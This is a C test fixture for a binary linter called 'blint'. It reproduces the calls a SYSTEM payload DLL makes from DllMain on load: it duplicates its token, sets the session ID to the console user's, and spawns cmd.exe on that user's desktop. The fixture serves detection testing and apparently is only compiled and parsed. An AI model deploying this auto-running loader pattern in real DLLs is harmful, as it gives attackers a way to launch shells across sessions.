/*
 * blint test fixture: the calls a SYSTEM payload DLL makes to start a process
 * on the console user's desktop (DLL_SYSTEM_SESSION_LAUNCH). Built at test
 * time with clang and lld-link, parsed, never run.
 *
 * TOKEN_CLASS selects the SetTokenInformation information class: 12 is
 * TokenSessionId, anything else is the negative variant.
 */
typedef void *HANDLE;
typedef int BOOL;
typedef unsigned long DWORD;
typedef unsigned short WCHAR;

#ifndef TOKEN_CLASS
#define TOKEN_CLASS 12
#endif

__declspec(dllimport) HANDLE __stdcall GetCurrentProcess(void);
__declspec(dllimport) DWORD __stdcall WTSGetActiveConsoleSessionId(void);
__declspec(dllimport) BOOL __stdcall OpenProcessToken(HANDLE, DWORD, HANDLE *);
__declspec(dllimport) BOOL __stdcall DuplicateTokenEx(HANDLE, DWORD, void *, int, int, HANDLE *);
__declspec(dllimport) BOOL __stdcall SetTokenInformation(HANDLE, int, void *, DWORD);
__declspec(dllimport) BOOL __stdcall CreateProcessAsUserW(
    HANDLE, const WCHAR *, WCHAR *, void *, void *, BOOL, DWORD, void *, const WCHAR *, void *, void *);

struct startup_info {
    DWORD cb;
    WCHAR *reserved;
    const WCHAR *desktop;
    char rest[80];
};

static struct startup_info startup;
static char process_info[24];

static void launch(void)
{
    HANDLE token = 0;
    HANDLE primary = 0;
    DWORD session = WTSGetActiveConsoleSessionId();

    startup.cb = sizeof(startup);
    startup.desktop = L"WinSta0\\Default";
    if (!OpenProcessToken(GetCurrentProcess(), 0x02000000, &token))
        return;
    if (!DuplicateTokenEx(token, 0x02000000, 0, 0, 1, &primary))
        return;
    if (!SetTokenInformation(primary, TOKEN_CLASS, &session, sizeof(session)))
        return;
    CreateProcessAsUserW(primary, L"C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 0,
                         0x00000010 | 0x01000000, 0, 0, &startup, process_info);
}

BOOL __stdcall DllMain(HANDLE module, DWORD reason, void *reserved)
{
    (void)module;
    (void)reserved;
    if (reason == 1)
        launch();
    return 0;
}
